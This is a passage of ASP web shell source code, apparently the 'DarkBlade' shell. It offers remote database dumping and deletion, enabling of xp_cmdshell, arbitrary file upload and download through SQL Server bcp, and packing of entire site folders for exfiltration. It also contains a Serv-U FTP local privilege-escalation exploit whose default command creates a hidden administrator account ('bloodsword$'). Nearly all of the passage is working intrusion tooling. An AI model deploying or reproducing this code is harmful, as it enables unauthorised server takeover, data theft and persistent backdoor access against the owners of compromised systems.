				doTdInput"button","","Upload","10%","onClick=""javascript:dosubmit('"&goaction&"','safile','')""",""
				doTtr
				doTtable
				doFform
				echo"</span>"
				doHideSpan"sadown",True
				doForm True
				doHidden"subAct","sadown"
				doHidden"connStr",connStr
				doTable"100%"
				doTr 1				
				doTd"Remoto file(full path)",""
				doTdInput"text","loadPath","","30%","",""
				doTd"Save as",""
				doTdInput"text","thePath",asppath,"30%","",""
				doTdSubmit"Download","10%"
				doTtr
				doTtable
				doFform
				echo"</span>"
			End If
			echo"<hr>"
		End If
	End Sub

	Sub delTable()
		If Not isDebugMode Then On Error Resume Next
		If dbType<>"others" Then strTable="["&strTable&"]"
		conn.Execute"drop table "&strTable,-1,&H0001
		If Err Then
			chkErr(Err)
		Else
			errMsgAdd("Table deleted.")
		End If
		showTables()
	End Sub
	Sub expTable()
		If Not isDebugMode Then On Error Resume Next
		If dbType<>"others" Then strTable="["&strTable&"]"
		Dim rs
		Set rs=conn.Execute("select * from "&strTable,-1,&H0001)
			dieErr(Err)
			If rs.Fields.Count>0 Then
				Response.Clear
				Session.CodePage=936
				Response.AddHeader"Content-Disposition","Attachment; Filename="&strTable&".xls"
				Session.CodePage=65001
				Response.AddHeader"Content-Type","application / ms - excel"
				echo"<table border=1><tr>"
				For i=0 To rs.Fields.Count-1
					echo"<td><b>"&rs.Fields(i).Name&"</b></td>"
				Next
				echo"</tr>"
				Do Until rs.EOF
					echo"<tr>"
					For i=0 To rs.Fields.Count-1
						echo"<td>"&htmlEnc(rs(i))&"</td>"
					Next
					echo"</tr>"
					rs.MoveNext
				Loop
				echo"</table>"
			Else
				errMsgAdd"It's empty."
				showTables()
				doFin
			End If
			rs.Close
			Set rs=Nothing
			response.End
	End Sub
	Sub saFile()
		strfrm="8.0|1|1       SQLIMAGE      0       {size}       """"                        1     binfile     """"|"
		conn.execute "If object_id('dark_temp')is not null drop table dark_temp"
		If InStr(sqlver,"Microsoft SQL Server 2005")>0 Then
			strfrm=Replace(strfrm,"8.0","9.0")
			conn.execute("EXEC master..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
		End If
		If subAct="sadown"Then
			Dim rs,size
			If thePath=""Or loadPath="" Then
				errMsgAdd"Not enough parameters."
				showTables()
				doFin
			ElseIf InstrRev(loadPath,".")<InstrRev(loadPath,"\")Then
				errMsgAdd"You can't download a folder -_-~!"
				showTables()
				doFin
			ElseIf InstrRev(thePath,".")<InstrRev(thePath,"\")Then
				thePath=thePath&"\"&getRight(loadPath,"\")
			End If
			Set rs=CreateObj("Adodb.RecordSet")
			Set rs=conn.execute("EXEC master..xp_cmdshell 'dir """&loadPath&""" | find """&getRight(loadPath,"\")&"""'",-1,&H0001)
			rs.movefirst
			size=Replace(Trim(regExecute(rs(0)," [0-9,]+ ",False)(0)),",","")
			If size=""Or Not IsNumeric(size)Then
				errMsgAdd("Get size error.")
				doFin
			End If
			strfrm=Replace(strfrm,"{size}",size)
			rs.Close
			Set rs=Nothing
		Else
			strfrm=Replace(strfrm,"{size}",0)
		End If
		arrfrm=Split(strfrm,"|")
		For Each substrfrm In arrfrm
			conn.execute("EXEC master..xp_cmdshell 'echo "&substrfrm&" >>c:\tmp.fmt'")
		Next
		If subAct="saup"Then
			saUpload()
		Else
			saDownload()
		End If
		conn.execute "If object_id('dark_temp')is not null drop table dark_temp"
		conn.execute("EXECUTE master..xp_cmdshell 'del c:\tmp.fmt'")
		showTables()
	End Sub
	Sub saUpload()
		If Not isDebugMode Then On Error Resume Next
		Dim rs,theFile,arrfrm,nowdb
		If thePath="" Then thePath=aspPath
		If InStr(thePath,":")<1 Then thePath=aspPath&"\"&thePath
		Set theFile=cls_upload.File("safile")
		If InstrRev(thePath,"\")>InstrRev(thePath,".")Then thePath=thePath&"\"&theFile.FileName
		conn.execute "CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];"
		Set rs=CreateObj("Adodb.RecordSet")
		rs.Open "SELECT * FROM dark_temp where id is null",conn,1,3
		rs.AddNew
		rs("binfile").AppendChunk theFile.InFile()
		rs.Update
		conn.execute("exec master..xp_cmdshell'bcp ""select binfile from "&dbname&"..dark_temp"" queryout """&thePath&""" -T -f c:\tmp.fmt'")
		set rs=conn.execute("EXECUTE master..xp_fileexist '"&thePath&"'")
		If Err Then
			chkErr(Err)
		ElseIf rs(0)=1 Then 
			errMsgAdd("File uploaded, have fun.")
		Else
			errMsgAdd("Upload failed, RPWT?")
		End If
		rs.close
		Set rs=Nothing
	End Sub
	Sub saDownload()
		Dim rs
		If Not isDebugMode Then On Error Resume Next
		conn.execute "CREATE TABLE [dark_temp] ([binfile] [Image] NULL)"
		conn.execute("exec master..xp_cmdshell'bcp """&dbname&"..dark_temp"" in """&loadpath&""" -T -f c:\tmp.fmt'")
		Set rs=CreateObj("Adodb.RecordSet")		
		rs.Open "select * from dark_temp",conn,1,1
		streamSaveToFile thePath,rs(0),1
		If Err Then
			chkErr(Err)
		Else
			errMsgAdd("File downloaded,have fun.")
		End If
		rs.close
		Set rs=Nothing
	End Sub
	Sub showTables()
		Dim objTable,objColumn,intDefinedSize,strNullAble,spanId,rsTable
		If Not isDebugMode Then On Error Resume Next
		spanId=1
		trId=0
		Set rsTable=conn.OpenSchema(20,Array(Empty,Empty,Empty,"table"))
		dieErr(Err)
		Do Until rsTable.Eof
			doSpan spanId
			doLabel"<b>"&rsTable("Table_Name")&"</b>"
			echo"<label>"
			doSqlHref "showQuery","","",rsTable("Table_Name"),"","Show content",""
			echo"</label>"
			echo"<label>"
			doSqlHref "showStructure","","",rsTable("Table_Name"),"","Show structure",""
			echo"</label>"
			echo"<label>"
			doSqlHref "expTable","","",rsTable("Table_Name"),"","Export",""
			echo"</label>"
			echo"<label>"
			doSqlHref "delTable","","",rsTable("Table_Name"),"","Delete",""
			echo"</label>"
			If subAct="showStructure"And strTable=rsTable("Table_Name")Then
				Set rsColumn=conn.OpenSchema(4,Array(Empty,Empty,rsTable("Table_Name").value))
				echo"<span>"
				echo"<center>"
				doTable"80%"
				doTr trId
				trIdAdd
				doTd"Name",""
				doTd"Type",""
				doTd"Size",""
				doTd"Nullable",""
				doTtr
				Do Until rsColumn.Eof
					intDefinedSize=rsColumn("Character_Maximum_Length")
					If intDefinedSize="" Then intDefinedSize=rsColumn("Is_Nullable")
					doTr trId
					doTd rsColumn("Column_Name"),""
					doTd getDataType(rsColumn("Data_Type")),""
					doTd intDefinedSize,""
					doTd rsColumn("Is_Nullable"),""
					doTtr
					trIdAdd
					rsColumn.MoveNext
				Loop
				doTtable
				echo"</center></span>"
			End If
			echoLine"<br></span>"
			trIdAdd
			spanId=spanId+1
			If spanId=2 Then spanId=0
			rsTable.MoveNext
		Loop
		Set rsTable=Nothing
		Set rsColumn=Nothing
		chkerr(Err)
	End Sub
	Sub showQuery()
		Dim i,j,x,rs,Cat,strPrimaryKey,sExec,pageNum,tmpQueryStr
		If Not isDebugMode Then On Error Resume Next
		Set Cat=CreateObj("ADOX.Catalog")
		Cat.ActiveConnection=conn.ConnectionString
		Set rs=CreateObj("Adodb.RecordSet")
		If Lcase(Left(queryStr,7))="select " And dbType<>"others" Then
			If intPage=""Then intPage=1
			rs.Open queryStr,conn,1,1
			dieErr(Err)
			intPage=CInt(intPage)
			rs.PageSize=sqlPageSize
			If Not rs.Eof Then
				rs.AbsolutePage=intPage
			End If
			If rs.Fields.Count > 0 Then
				echo"<table width='100%' cellspacing='0' border='0' style='border-width:0px;border-collapse:collapse;'>"
				doTr 1
				For j=0 To rs.Fields.Count-1
					doTdNoWrap htmlEnc(rs.Fields(j).Name)
				Next
				doTtr
				trId=0
				For i=1 To rs.PageSize
					If rs.Eof Then Exit For
					doTr trId
					For j=0 To rs.Fields.Count-1
						doTdNoWrap htmlEnc(rs(j))
					Next
					doTtr
					trIdAdd
					rs.MoveNext
				Next
			End If
			doTr trId
			pageNum=rs.RecordCount/sqlPageSize
			If InStr(pageNum,".")>0 Then pageNum=Int(pageNum)+1
			echo"<td colspan="&rs.Fields.Count&">"
			echoLine rs.RecordCount&" records in total,page "&pageNum
			doSqlHref "showQuery","","",strTable,"1","&laquo;",htmlEnc(" ")
			tmpQueryStr=""
			If strTable=""Then tmpQueryStr=Replace(queryStr,"'","\'")
			For i=1 To pageNum
				If i=intPage Then
					echo htmlEnc(" "&i&" ")
				Else
					echo htmlEnc(" ")
					doSqlHref "showQuery","",tmpQueryStr,strTable,i,i,htmlEnc(" ")
				End If
			Next
			echo htmlEnc(" ")
			doSqlHref "showQuery","",tmpQueryStr,strTable,pageNum,"&raquo;",""
			echo"</td>"
			doTtr
			doTtable
			rs.Close
		Else
			Set rs=conn.Execute(queryStr,-1,&H0001)
			dieErr(Err)
			If rs.Fields.Count>0 Then
				doTable"100%"
				doTr 1
				For i=0 To rs.Fields.Count-1
					doTdNoWrap htmlEnc(rs.Fields(i).Name)
				Next
				doTtr
				trId=0
				Do Until rs.EOF
					doTr trId
					For i=0 To rs.Fields.Count-1
						doTdNoWrap htmlEnc(rs(i))
					Next
					doTtr
					rs.MoveNext
					trIdAdd
				Loop
				doTtable
				rs.Close
			Else
				errMsgAdd"Query got null recordSet."
			End If
			Set rs=Nothing
			Set Cat=Nothing
		End If
		chkerr(Err)
	End Sub

	Sub CreateConn(connStr)
		If Not isDebugMode Then On Error Resume Next
		Set conn=CreateObj("Adodb.Connection")
		conn.Open connStr
		dieErr(Err)
	End Sub

	Sub DestoryConn()
		If Not isDebugMode Then On Error Resume Next
		If IsObject(conn)Then
			conn.Close
			Set conn=Nothing
		End If
	End Sub

	Function GetDataType(flag)
		Dim str
		Select Case flag
			Case 0: str="EMPTY"
			Case 2: str="SMALLINT"
			Case 3: str="INTEGER"
			Case 4: str="SINGLE"
			Case 5: str="DOUBLE"
			Case 6: str="CURRENCY"
			Case 7: str="DATE"
			Case 8: str="BSTR"
			Case 9: str="IDISPATCH"
			Case 10: str="ERROR"
			Case 11: str="BIT"
			Case 12: str="VARIANT"
			Case 13: str="IUNKNOWN"
			Case 14: str="DECIMAL"
			Case 16: str="TINYINT"
			Case 17: str="UNSIGNEDTINYINT"
			Case 18: str="UNSIGNEDSMALLINT"
			Case 19: str="UNSIGNEDINT"
			Case 20: str="BIGINT"
			Case 21: str="UNSIGNEDBIGINT"
			Case 72: str="GUID"
			Case 128: str="BINARY"
			Case 129: str="CHAR"
			Case 130: str="VARCHAR"
			Case 131: str="NUMERIC"
			Case 132: str="USERDEFINED"
			Case 133: str="DBDATE"
			Case 134: str="DBTIME"
			Case 135: str="DBTIMESTAMP"
			Case 136: str="CHAPTER"
			Case 200: str="WCHAR"
			Case 201: str="TEXT"
			Case 202: str="NVARCHAR"
			Case 203: str="NTEXT"
			Case 204: str="VARBINARY"
			Case 205: str="LONGVARBINARY"
			Case Else: str=flag
		End Select
		GetDataType=str
	End Function

	Sub showEdit()
		If Not isDebugMode Then On Error Resume Next
		Dim theFile,strContent,parPath,tmputf
		If Right(thePath,1)="\"Then
			errMsgAdd"Can't edit a directory!"
			doFin
		End If
		parPath=getLeft(thePath,"\",False)
		doForm True
		If goaction="FsoFileExplorer"And subAct="showEdit" Then
			strContent=FsoRead(thePath)
		Else
			strContent=streamLoadFromFile(thePath)
		End If
		chkerr(Err)
		doTextarea"fileContent",strContent,"100%","25",""
		If subAct="utfEdit" Then
			doHidden"subAct","utfSave"
		Else
			doHidden"subAct","save"
		End If
		echo"Save as :"
		doInput"text","thePath",thePath,"60",""
		echo" Encode:"
		doSelect"act","80px","onchange=""javascript:if(this.value!=''){dosubmit('"&goaction&"',this.value,'"&doPathFormat(thePath)&"');}"""
		doOption"showEdit","Default"
		tmputf="<option value=""utfEdit"" {$}>Utf-8</option>"
		If subAct="utfEdit" Then
			tmputf=Replace(tmputf,"{$}","selected")
		End If
		echo tmputf
		doSselect
		echo" "
		doSubmit"Save"
		echo" "
		doInput"reSet","","ReSet","",""
		echo" "
		doInput"button","clear","Clear","","onClick=""javascript:this.form.fileContent.innerText=''"""
		echo" "
		doInput"button","","Go back","","onClick=""javascript:dosubmit('"&goaction&"','','"&doPathFormat(parPath)&"')"""
		doFform
		chkerr(Err)
		doFin
	End Sub
	Sub saveFile()
		If Not isDebugMode Then On Error Resume Next
		If goaction="FsoFileExplorer"And subAct="save" Then
			fsoSaveToFile thePath,fileContent
		Else
			streamSaveToFile thePath,fileContent,2
		End If
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"File saved."
		End If
	End Sub
	Sub PageAddToMdb()
		If Not isDebugMode Then On Error Resume Next
		Server.ScriptTimeOut=5000
		If thePath=""Then thePath=pubPam
		If thePath=""Then thePath=aspPath
		If mdbPath=""Then mdbPath=mapath("DarkBlade.mdb")
		If packMethod=""Then packMethod="fso"
		showTitle"File Packer/Unpacker"
		echo"<center>"
		doTable"100%"
		doTr 1
		doForm True
		doTd"File Pack","10%"
		doTdInput"text","thePath",thePath,"30%","",""
		echoLine"<td style=""width:50%;"">"
		doSelect"subAct","80px",""
		doOption"fsoPack","FSO"
		doOption"appPack","UnFSO"
		doSselect
		echo" Pack as : "
		doInput"text","mdbPath",mdbPath,40,""
		echo"</td>"
		doTdSubmit"Pack","10%"
		doTtr
		doTr 0
		doTd"Exceptional folder",""
		doTdInput"text","outPath",outPath,"30%","",""
		echo"<td colspan=""2"">"
		echo"Exceptional file type,split with | "
		doInput"text","outExt",outExt,40,""
		echo"</td></tr>"
		doTtable
		doFform
		echo"<hr>"
		doTable"100%"
		doTr 1
		doForm True
		doHidden"subAct","unpa"
		doTd"Release to","10%"
		doTdInput"text","thePath",thePath,"30%","",""
		echoLine"<td> Mdb path : "
		doInput"text","mdbPath",mdbPath,40,""
		echo"</td>"
		doTdSubmit"Unpack","10%"
		doFform
		doTtr
		doTtable
		echo"</center>"
		echo"<hr>Notice: Unpacking need FSO object,all files unpacked will be under target folder,replacing same named!"
		Select Case subAct
			Case"fsoPack"
				AddToMdb"fso"
			Case"appPack"
				AddToMdb"app"
			Case"unpa"
				doUnPack()
		End Select
	End Sub
	Sub AddToMdb(packMethod)
		If Not isDebugMode Then On Error Resume Next
		Dim rs,connStr,adoCatalog
		Set rs=CreateObj("ADODB.RecordSet")
		Set objStream=CreateObj("adodb.stream")
		Set adoCatalog=CreateObj("ADOX.Catalog")
		If InStr(mdbPath,":\")<1 Then mdbPath=mapath(mdbPath)
		mdbName=getRight(mdbPath,"\")
		connStr=getJetStr(mdbPath)
		adoCatalog.Create connStr
		CreateConn(connStr)
		conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)")
		dieErr Err
		objStream.Open
		objStream.Type=1
		rs.Open"FileData",conn,3,3
		mdbName=Lcase(mdbName)
		mdbName2=Replace(mdbName,".mdb",".ldb")
		If packMethod="fso"Then
			fsoTreeForMdb thePath,thePath,rs,objStream
		Else
			saTreeForMdb thePath,thePath,rs,objStream
		End If
		rs.Close
		DestoryConn
		objStream.Close
		Set rs=Nothing
		Set objStream=Nothing
		Set adoCatalog=Nothing
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"Packing completed"
		End If
	End Sub
	Sub fsoTreeForMdb(thePath,subPath,rs,objStream)
		If Not isDebugMode Then On Error Resume Next
		Dim item,theFolder,objFolder,files
		If Not(objFso.FolderExists(subPath))Then
			errMsgAdd"Folder dosen't exists or access denied!"
			doFin
		End If
		outPath=Lcase(outPath)
		Set theFolder=objFso.GetFolder(subPath)
		For Each item In theFolder.Files
			If Not(regTest(getRight(item.name,"."),"^("&outExt&")$") Or Lcase(item.Name)=mdbName Or Lcase(item.Name)=mdbName2)Then
				rs.AddNew
				rs("strPath")=Replace(item.Path,thePath&"\","")
				objStream.LoadFromFile(item.Path)
				rs("binContent")=objStream.Read()
				rs.Update
			End If
		Next
		For Each item In theFolder.SubFolders
			If Not regTest(item.name,"^("&outPath&")$")Then
				fsoTreeForMdb thePath,item.Path,rs,objStream
			End If
		Next
		Set files=Nothing
		Set objFolder=Nothing
		Set theFolder=Nothing
	End Sub
	Sub saTreeForMdb(thePath,subPath,rs,objStream)
		If Not isDebugMode Then On Error Resume Next
		Dim item,theFolder,sysFileList
		Set theFolder=objSa.NameSpace(subPath)
		For Each item In theFolder.Items
			If Not item.IsFolder And Lcase(item.Name)<>mdbName And Lcase(item.Name)<>mdbName2 And Not(regTest(getRight(item.name,"."),"^("&outExt&")$"))  Then
				rs.AddNew
				rs("strPath")=Replace(item.Path,thePath&"\","")
				objStream.LoadFromFile(item.Path)
				rs("binContent")=objStream.Read()
				rs.Update
			End If
		Next
		For Each item In theFolder.Items
			If item.IsFolder And Not regTest(item.name,"^("&outPath&")$") Then
				saTreeForMdb thePath,item.Path,rs,objStream
			End If
		Next
		Set theFolder=Nothing
	End Sub
	Sub doUnPack()
		If Not isDebugMode Then On Error Resume Next
		Server.ScriptTimeOut=5000
		Dim rs,str,theFolder
		thePath=thePath
		thePath=Replace(thePath,"\\","\")
		If InStr(mdbPath,":\")<1 Then mdbPath=mapath(mdbPath)
		Set rs=CreateObj("ADODB.RecordSet")
		Set objStream=CreateObj("adodb.stream")
		connStr=getJetStr(mdbPath)
		CreateConn(connStr)
		rs.Open"FileData",conn,1,1
		dieErr Err
		objStream.Open
		objStream.Type=1
		Do Until rs.Eof
			If InStr(rs("strPath"),"\")>0 Then
				theFolder=thePath&"\"&getLeft(rs("strPath"),"\",False)
			Else
				theFolder=thePath
			End If
			If Not objFso.FolderExists(theFolder)Then
				objFso.CreateFolder(theFolder)
			End If
			objStream.SetEos()
			objStream.Write rs("binContent")
			objStream.SaveToFile thePath&"\"&rs("strPath"),2
			rs.MoveNext
		Loop
		rs.Close
		DestoryConn
		objStream.Close
		Set rs=Nothing
		Set objStream=Nothing
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"Unpacking completed"
		End If
	End Sub

	Sub PageTxtSearcher()
		If Not isDebugMode Then On Error Resume Next
		Server.ScriptTimeOut=5000
		Dim theFolder
		showTitle("Text File Searcher/Replacer")
		If thePath=""Then
			thePath=rootPath
		End If
		doForm True
		doTable"100%"
		doTr 1
		doTd"Keyword","20%"
		doTdText"searchkey",searchkey,4
		echo"<td>"
		doSelect"subAct","80px",""
		doOption"fsoSearch","FSO"
		doOption"saSearch","UnFSO"
		doSselect
		echo"<br>"
		doChkBox"useReg",1," Regexp",""
		echoLine"</td>"
		doTtr
		doTr 0
		doTd"Replace as",""
		doTdText"strReplaceTo",strReplaceTo,4
		echo"<td>"
		doChkBox"needReplace",1," Replace",""
		echoLine"</td>"
		doTtr
		doTr 1
		doTd"Path",""
		doTdInput"text","thePath",thePath,"","",""
		echo"<td>"
		doInput"radio","searchType","filename","",""
		echo"File name "
		doInput"radio","searchType","fileContent","","checked"
		echo"File content"
		echo"</td>"
		doTtr
		doTr 0
		doTd"Search type",""
		doTdInput"text","searchExt",textExt,"","",""
		doTdSubmit"Search",""
		doTtr
		doTtable
		If searchkey<>""Then
			echo"<hr>"
			doUl
			If subAct="fsoSearch"Then
				Set theFolder=objFso.GetFolder(thePath)
				Call searchFolder(theFolder,searchkey)
				Set theFolder=Nothing
			ElseIf subAct="saSearch"Then
				Call appSearchIt(thePath,searchkey)
			End If
			echo"</ul>"
		End If
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"Search completed"
		End If
		doFin
	End Sub
	Sub searchFolder(folder,str)
		Dim ext,title,theFile,theFolder,needReg
		needReg=False
		If useReg=1 Then needReg=True
		For Each theFile In folder.Files
			ext=Lcase(getRight(theFile.Name,"."))
			If searchType="filename"Then
				If needReg And regTest(theFile.Name,str)Then
					dofileLink theFile.Path,"fso"
				ElseIf InStr(1,theFile.Name,str,1) > 0 Then
					dofileLink theFile.Path,"fso"
				End If
			Else
				If regTest(ext,"^("&searchExt&")$")Then
					If searchFile(theFile.Path,str,"fso",needReg) Then
						dofileLink theFile.Path,"fso"
					End If
				End If
			End If
		Next
		For Each theFolder In folder.subFolders
			searchFolder theFolder,str
		Next
		chkerr(Err)
	End Sub
	Function searchFile(sPath,s,method,needReg)
		If Not isDebugMode Then On Error Resume Next
		Dim theFile,content,find
		find=False
		If method="fso" Then
			content=fsoRead(sPath)
		Else
			content=streamLoadFromFile(sPath)
		End If
		If Err Then
			chkerr(Err)
			searchFile=False
			Exit Function
		End If
		If needReg Then
			find=regTest(content,s)
		ElseIf InStr(1,content,s,1)>0 Then
			find=True
		End If
		If needReplace Then
			If needReg Then
				content=regReplace(content,s,strReplaceTo,False)
			Else
				content=Replace(content,s,strReplaceTo,1,-1,1)
			End If
			If method="fso" Then
				fsoSaveToFile sPath,content
			Else
				streamSaveToFile sPath,content,2
			End If
		End If
		searchFile=find
		chkerr(Err)
	End Function
	Sub appSearchIt(thePath,theKey)
		If Not isDebugMode Then On Error Resume Next
		Dim title,ext,objFolder,objItem,fileName,needReg
		needReg=False
		If useReg=1 Then needReg=True
		Set objFolder=objSa.NameSpace(thePath)
		For Each objItem In objFolder.Items
			If objItem.IsFolder Then
				Call appSearchIt(objItem.Path,theKey)
			Else
				ext=Lcase(getRight(objItem.Path,"."))
				fileName=getRight(objItem.Path,"\")
				If searchType="filename"Then
					If needReg And regTest(fileName,str)Then
						dofileLink theFile.Path,"app"
					ElseIf InStr(Lcase(fileName),Lcase(str)) > 0 Then
						dofileLink theFile.Path,"app"
					End If
				Else
					If regTest(subExt,"^("&searchExt&")$")Then
						If searchFile(objItem.Path,theKey,"app",needReg) Then
							doFileLink objItem.Path,"app"
						End If
					End If
				End If
			End If
		Next
		chkerr(Err)
	End Sub
	Sub doFileLink(sPath,typpe)
		Dim strAction
		If typpe="fso"Then
			strAction="FsoFileExplorer"
		Else
			strAction="SaFileExplorer"
		End If
		echo"<li><u>"&sPath&"</u>"
		doSubHref strAction,"showEdit",doPathFormat(sPath),"Edit",""
		Response.Flush()
	End Sub
	Sub PageServUp()
		If Not isDebugMode Then On Error Resume Next
		Dim ftpDomain
		ftpDomain="darkblade"
		loginuser="User "&suUser&vbCrLf
		loginpass="Pass "&suPass&vbCrLf
		deldomain="-DELETEDOMAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&nport&vbCrLf
		mt="SITE MAINTENANCE"&vbCrLf
		newdomain="-SetDOMAIN"&vbCrLf&"-Domain="&ftpDomain&"|0.0.0.0|"&nport&"|-1|1|0"&vbCrLf&"-TZOEnable=0"&vbCrLf&" TZOKey="&vbCrLf
		newuser="-SetUSERSetUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&nport&vbCrLf&"-User="&nuser&vbCrLf&"-Password="&npass&vbCrLf&_
				"-HomeDir="&Gpath()&"\\"&vbCrLf&"-LoginMesFile="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPaths=1"&vbCrLf&_
				"-NeedSecure=0"&vbCrLf&"-HideHidden=0"&vbCrLf&"-AlwaysAllowLogin=0"&vbCrLf&"-ChangePassword=0"&vbCrLf&_
				"-QuotaEnable=0"&vbCrLf&"-MaxUsersLoginPerIP=-1"&vbCrLf&"-SpeedLimitUp=0"&vbCrLf&"-SpeedLimitDown=0"&vbCrLf&_
				"-MaxNrUsers=-1"&vbCrLf&"-IdleTimeOut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
				"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
				"-Maintenance=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access="&Gpath()&"\\|RWAMELCDP"&vbCrLf
		suquit="QUIT"&vbCrLf
		showTitle("Serv-U FTP Exp")
		Select Case subAct
			Case "1"
				doSuStep1
			Case "2"
				doSuStep2
			Case "3"
				doSuStep3
			Case "4"
				doSuForm2
			Case "5"
				doSuForm3
			Case Else
			If IsObject(Session("a"))Then Session("a").abort
			If IsObject(Session("b"))Then Session("b").abort
			If IsObject(Session("c"))Then Session("c").abort
			Set Session("a")=Nothing
			Set Session("b")=Nothing
			Set Session("c")=Nothing
				doForm True
				doHidden "subAct",1
				echo"<center><b>Add Temp Domain</b><br>"
				doTable "80%"
				doTr 1
				doTd"Local user","20%"
				doTdInput"text","suUser","LocalAdministrator","30%","",""
				doTd"Local pass","20%"
				doTdInput"text","suPass","#l@$ak#.lk;0@P","30%","",""
				doTtr
				doTr 0
				doTd" Local port",""
				doTdInput"text","suPort","43958","","",""
				doTd"Sys drive",""
				doTdInput"text","suPath",Gpath(),"","",""
				doTtr
				doTr 1
				doTd"New user",""
				doTdInput"text","nuser","go","","",""
				doTd"New pass",""
				doTdInput"text","npass","od","","",""
				doTtr
				doTr 0
				doTd"New port",""
				doTdInput"text","nport","60000","","",""
				echo"<td>"
				doSubmit"Go"
				echo"</td><td>"
				doInput"reSet","","ReSet","",""
				echo"</td></tr>"
				doTtable
				echo"</center>"
				doFform
		End Select
		echo"<hr>"
		echo"<center>"
		doTable "80%"
		doTr 1
		echo"<td>"
		doSubHref goaction,"","","Add domain",""
		echo"</td>"
		echo"<td>"
		doSubHref goaction,4,"","Exec cmd",""
		echo"</td>"
		echo"<td>"
		doSubHref goaction,5,"","Clean domain",""
		echo"</td>"
		doTtr
		doTtable
		echo"</center>"
		doFin
	End Sub
	Sub doSuStep1()
		If Not isDebugMode Then On Error Resume Next
		Set a=CreateObj("Microsoft.XMLHTTP")
		a.open"GET","http://127.0.0.1:"&suPort&"/goldsun/upadmin/s1",True,"",""
		a.send loginuser&loginpass&mt&deldomain&newdomain&newuser&suquit
		Set Session("a")=a
		errMsgAdd"Connecting 127.0.0.1:"&suPort&" using "&suUser&",pass:"&suPass&"..."
		doSuForm2
	End Sub
	Sub doSuStep2()
		If Not isDebugMode Then On Error Resume Next
		doSuForm2()
		Set b=CreateObj("Microsoft.XMLHTTP")
		b.open"GET","http://"&getServerVariable("LOCAL_ADDR")&":"&nport&"/goldsun/upadmin/s2",False,"",""
		b.send"User "&nuser&vbCrLf&"pass "&npass&vbCrLf&"site exec "&suCmd&vbCrLf&suquit
		Set Session("b")=b
		errMsgAdd"Executing command..."
		echoLine"<hr><center><div class='alt1Span' style='width:80%;text-align:left'><br>"
		echoLine Replace(b.ResponseText,chr(10),"<br>")&"</div></center>"
	End Sub
	Sub doSuStep3()
		If Not isDebugMode Then On Error Resume Next
		Set c=CreateObj("Microsoft.XMLHTTP")
		c.open "GET","http://127.0.0.1:"&suPort&"/goldsun/upadmin/s3",True,"",""
		c.send loginuser&loginpass&mt&deldomain&suquit
		Set Session("c")=c
		errMsgAdd"Temp domain deleted!"
		echo"<script language='javascript'>setTimeout(""dosubmit('"&goaction&"','','')"",""3000"");</script>"
	End Sub
	Function Gpath()
		If Not isDebugMode Then On Error Resume Next
		Gpath=Lcase(Left(objFso.GetSpecialFolder(0),2))
		If Gpath=""Then Gpath="c:"
	End Function
	Sub doSuForm2()
		If nuser=""Then nuser="go"
		If npass=""Then npass="od"
		If nport=""Then nport="60000"
		doForm True
		doHidden "subAct",2
		echo"<center><b>Execute Cmd</b><br>"
		doTable "80%"
		doTr 1
		doTd"Command",""
		doTdInput"text","suCmd","cmd /c net user bloodsword$ 0kee /add & net localgroup administrators bloodsword$ /add","","",3
		doTtr
		doTr 0
		doTd"Ftp user",""
		doTdInput"text","nuser",nuser,"","",""
		doTd"Ftp pass",""
		doTdInput"text","npass",npass,"","",""
		doTtr
		doTr 1
		doTd"Ftp port",""
		doTdInput"text","nport",nport,"","",""
		echo"<td>"
		doSubmit"Go"
		echo"</td><td>"
		doInput"reSet","","ReSet","",""
		echo"</td></tr>"
		doTtable
		echo"</center>"
		doFform
	End Sub
	Sub doSuForm3()
		doForm True
		doHidden "subAct",3
		echo"<center><b>Clean Temp Domain</b><br>"
		doTable "80%"
		doTr 1
		doTd"Local user","20%"
		doTdInput"text","suUser","LocalAdministrator","30%","",""
		doTd"Local pass","20%"
		doTdInput"text","suPass","#l@$ak#.lk;0@P","30%","",""
		doTtr
		doTr 0
		doTd"Local port",""
		doTdInput"text","suPort","43958","","",""
		doTd"Temp domain port",""
		doTdInput"text","nport","60000","","",""
		doTtr
		doTr 1
		echo"<td>"
		doSubmit"Go"
		echo"</td><td colspan='3'>"
		doInput"reSet","","ReSet","",""
		echo"</td></tr>"
		doTtable
		echo"</center>"
		doFform
	End Sub

	Sub PageScan()
		If Not isDebugMode Then On Error Resume Next
		Dim theFolder
		showTitle"Asp Webshell Scanner"
		echo"Path : "
		doForm True
		doInput"text","thePath","/",50,""
		echo" "
		doSubmit"Scan"
		doChkBox"getInc",1," Get include files",""
		If thePath<>""Then
			If InStr(thePath,":\")<1 Then thePath=mapath(thePath)
			echo"<hr>"
			Response.Flush()
			doUl
			Set theFolder=objFso.GetFolder(thePath)
			doScan(theFolder)
			Set theFolder=Nothing
			echo"</ul>"
		End If
		doFin
	End Sub
	Sub doScan(theFolder)
		If Not isDebugMode Then On Error Resume Next
		Server.ScriptTimeOut=5000
		Dim shellObjLst,funcLst,ext,objName,funcs,needScan,strInclude,theFile,content,echoed
		shellObjLst="Wscript.Shell|Wscript.Shell.1|Shell.Application|Shell.Application.1|clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8|clsid:13709620-C279-11CE-A49E-444553540000"
		funcLst="Wscript.Shell;Run,Exec,RegRead|Shell.Application;ShellExecute|Scripting.FileSystemObject;CreateTextFile,OpenTextFile,SavetoFile"
		For Each objFile In theFolder.Files
			echoed=False
			needScan=False
			ext=Lcase(getRight(objFile.Name,"."))
